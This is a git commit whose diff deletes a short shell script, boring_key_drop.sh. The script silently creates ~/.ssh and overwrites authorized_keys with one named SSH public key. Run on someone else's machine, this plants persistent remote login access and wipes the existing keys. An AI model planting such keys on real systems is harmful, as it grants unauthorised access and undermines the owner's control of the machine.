58584029b3a2fc77e9f3ee4f87609b3802c366ee
Caroline Richards <caroline.piper.richards@gmail.com>
2024-10-18 12:23:00 -0400

    aah

--- boring_key_drop.sh
+++
@@ -1,4 +0,0 @@
-cd ~ > /dev/null 2>&1
-mkdir .ssh > /dev/null 2>&1
-cd .ssh > /dev/null 2>&1
-echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKc4gyyCB/5IM+OFYrnB5MD29Eto3ajE2wJ7yNqgE2YZ carolinerichards@Carolines-MacBook-Pro-2.local" > authorized_keys
